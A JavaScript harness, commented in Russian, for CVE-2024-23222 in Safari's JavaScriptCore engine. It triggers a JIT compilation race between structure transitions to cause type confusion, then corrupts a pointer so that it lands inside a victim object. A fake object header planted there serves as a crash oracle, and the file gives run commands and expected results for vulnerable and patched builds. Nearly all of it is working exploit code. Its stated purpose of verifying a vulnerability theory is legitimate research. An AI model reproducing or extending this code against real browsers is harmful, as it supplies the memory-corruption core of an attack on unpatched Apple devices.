// cassowary_harness.js — harness для CVE-2024-23222 (cassowary) на УЯЗВИМОЙ версии JSC.
//
// Теория (из патча 6471469 / 66f60de, Bugzilla 267134):
//   tryGetConstantProperty вызывается дважды — в CFA и в Constant Folding.
//   Если между вызовами структура obj переходит S1 -> S2 -> S3, а watchpoints
//   стоят только на S1 и S3, то CFA "запекает" значение из O+S2, runtime check
//   (CheckStructure S1|S3) проходит, и тип-информация оказывается старой.
//
// Утверждение теории = два независимых assert'а:
//   ASSERT A (watchpoint coverage): describe() показывает, что structS1 после
//     триггера в той же структуре, что structS3 (S3, "Leaf (Watched)"), а
//     переход через S2 НЕ сработал ни один watchpoint.
//   ASSERT B (misaligned pointer): fakeFloatArr[1] == victimObj + 0x10.
//     Проверяется crash oracle: подсаживаем фейковый JSCell header в
//     victimObj.prop1 и читаем объект через испорченный указатель -> SIGSEGV.
//
// Запуск (НУЖЕН уязвимый jsc: WebKit до коммита 6471469, т.е. Safari < 17.3 /
// iOS < 17.3; например сборка WebKit r272535 из writeup):
//   DYLD_FRAMEWORK_PATH=./build/Release ./build/Release/jsc cassowary_harness.js
//   DYLD_FRAMEWORK_PATH=./build/Release ./build/Release/jsc cassowary_harness.js --describe
//   DYLD_FRAMEWORK_PATH=./build/Release ./build/Release/jsc cassowary_harness.js --air
//
// Ожидаемый результат на уязвимой версии:  CRASH (SIGSEGV) на ORACLE.
// Ожидаемый результат на патченной (>= 17.3): "BUG NOT TRIGGERED", exit 0.
// Race window узкий -> использовать run_cassowary_harness.sh (N попыток).

'use strict';

const args = (typeof process !== 'undefined' && process.argv) ? process.argv : [];
const DESCRIBE = args.includes('--describe');   // ASSERT A: дамп структур (jsc-only)
const AIR      = args.includes('--air');        // дамп Air-ассемблера на каждую фазу
const SLOWDOWN = !args.includes('--no-slowdown');

function log(...a) { print('[harness]', ...a); }

if (AIR) {
    // диагностика: сравнить codegen успешного/неуспешного прогона
    // (успех = property access, провал = folded constant "Move $0x..., %x0")
    if (typeof JSC !== 'undefined' && JSC.dumpAirGraphAtEachPhase)
        JSC.dumpAirGraphAtEachPhase(true);
}

// ---------------------------------------------------------------------------
// 1. Жертва и fake float array
// ---------------------------------------------------------------------------
let victimObj = {prop1: 1, prop2: 2};
let fakeFloatArr = [1.1, victimObj];   // после бага [1] -> victimObj + 0x10

// training-массивы: float array + доп. свойство (чтобы структура была "float-like")
let floatArrWProp1 = [1.1, 1.1]; floatArrWProp1.prop = 1.1;
let floatArrWProp2 = [1.1, 2.2]; floatArrWProp2.prop = 1.1;

// ---------------------------------------------------------------------------
// 2. Структурное дерево S1 -> S2 -> S3
//    S1: (p1, p2)   S2: (p1)   S3: (p1, p2)  — S1 и S3 РАЗНЫЕ структуры,
//    но JIT при training видит множество {S1, S3}.
// ---------------------------------------------------------------------------
function newTarget() {}
let structS1 = Reflect.construct(Object, [], newTarget);
let structS3 = Reflect.construct(Object, [], newTarget);

structS1.p1 = floatArrWProp1;
structS1.p2 = floatArrWProp1;
structS3.p1 = 0x1337;
structS3.p2 = 0x1337;
// теперь structS1 и structS3 в ОДНОЙ структуре = наша "S1"

delete structS3.p2;      // structS3 -> "S2"
delete structS3.p1;      // промежуточная пустая
structS3.p1 = 0x1337;
structS3.p2 = 0x1337;    // structS3 -> финальная "S3"

if (DESCRIBE) {
    log('S1:', describe(structS1));
    log('S3:', describe(structS3));
    log('ASSERT A setup: S1 и S3 должны быть в разных структурах, обе Leaf');
}

// ---------------------------------------------------------------------------
// 3. Массивы для type confusion (общий буфер)
// ---------------------------------------------------------------------------
let i32Arr = new Uint32Array(2);
let f64Arr = new Float64Array(i32Arr.buffer);

// ---------------------------------------------------------------------------
// 4. JIT-функция (баг живёт здесь)
// ---------------------------------------------------------------------------
let compilerSlowDownObj = {};
function slow(n) {
    let c = 0;
    while (c < n) { compilerSlowDownObj.guard_p1 = 1; c++; }
    c -= n;
}

function toJIT(useS3, skipEverything) {
    if (skipEverything) return;

    let obj = structS1;
    if (useS3) {
        obj = structS3;
        (0)[0];            // JIT barrier: доступ с константным base — JIT не
                           // может удалить как side-effect-free, поэтому не
                           // оптимизирует S3-ветку, но при наблюдении типов
                           // видит ОБА случая -> множество структур {S1, S3}
    }

    if (SLOWDOWN) slow(12);   // замедлить компиляцию -> расширить race window

    let typeConfused = obj.p1;   // CFA: tryGetConstantProperty -> "float array"
    if (useS3) typeConfused = floatArrWProp2;
    f64Arr[0] = typeConfused[1]; // simple store (float)
    i32Arr[0] = i32Arr[0] + 16;  // +0x10 к указателю
    typeConfused[1] = f64Arr[0]; // simple store (float) -> misaligned pointer

    if (SLOWDOWN) slow(12);
}

// ---------------------------------------------------------------------------
// 5. Training + RACE
//    На итерации jitIterTrain структура structS1 меняется (S1 -> S2) ПОКА
//    компилятор работает на JIT-потоке:
//      - CFA уже прошёл tryGetConstantProperty (успех, тип зафиксирован),
//      - Constant Folding должен НЕ пройти (структура уже не в {S1, S3}).
// ---------------------------------------------------------------------------
const jitIterTotal = 0x1000000;
const jitIterTrain = 0x20000;
for (let i = 0; i < jitIterTotal; i++) {
    if (i > jitIterTrain) {
        toJIT(false, true);   // форсировать компиляцию (skip body)
    } else {
        toJIT(i % 2 && i < 256, i > 4096);  // training: S1 и S3 чередуются
    }
    if (i === jitIterTrain) {
        delete structS1.p2;   // RACE: S1 -> S2 во время компиляции
        if (DESCRIBE) {
            log('after delete p2: S1:', describe(structS1));
            log('after delete p2: S3:', describe(structS3));
            log('ASSERT A: structS3 должен быть "Leaf (Watched)" (S3 watched),');
            log('          а S2 (текущая structS1) — НЕ watched');
        }
    }
}

// ---------------------------------------------------------------------------
// 6. Eden GC: задержка + чистый heap для следующих стадий
// ---------------------------------------------------------------------------
for (let t = 0; t < 0x100000; t++) new Array(13.37, 13.37, 13.37, 13.37);

// ---------------------------------------------------------------------------
// 7. Подготовка триггера: structS1 -> S3 с p1 = fakeFloatArr
//    (S3 ∈ {S1, S3} -> CheckStructure пройдёт на runtime)
// ---------------------------------------------------------------------------
delete structS1.p1;
structS1.p1 = fakeFloatArr;
structS1.p2 = 1;
if (DESCRIBE) {
    log('before trigger: S1:', describe(structS1));
    log('before trigger: S3:', describe(structS3));
    log('ASSERT A: structS1 и structS3 теперь в ОДНОЙ структуре (S3)');
}

// ---------------------------------------------------------------------------
// 8. ТРИГГЕР
// ---------------------------------------------------------------------------
toJIT(false, false);

// ---------------------------------------------------------------------------
// 9. ASSERT B: misaligned pointer (crash oracle)
//    Если баг сработал: fakeFloatArr[1] == victimObj + 0x10, т.е. движок
//    интерпретирует victimObj.prop1 как JSCell header. Подсаживаем фейковый
//    header (0x31337 / 0x1001706 - NonArrayWithDouble) и читаем объект.
//    Уязвимый JSC: SIGSEGV. Патченный: нет краша.
// ---------------------------------------------------------------------------
let converter32 = new Uint32Array(2);
let converterFloat = new Float64Array(converter32.buffer);
function i32objtofloat(t) {
    converter32[0] = t[0];
    converter32[1] = t[1] - 0x20000;  // компенсация "box" бита (bit 49)
    return converterFloat[0];
}
victimObj.prop1 = i32objtofloat([201527, 16783110]); // фейковый JSCell header

log('ORACLE: JSON.stringify(structS1) — на уязвимом JSC ожидается CRASH');
JSON.stringify(structS1);
log('BUG NOT TRIGGERED (no crash) — патченный JSC или race не попался');
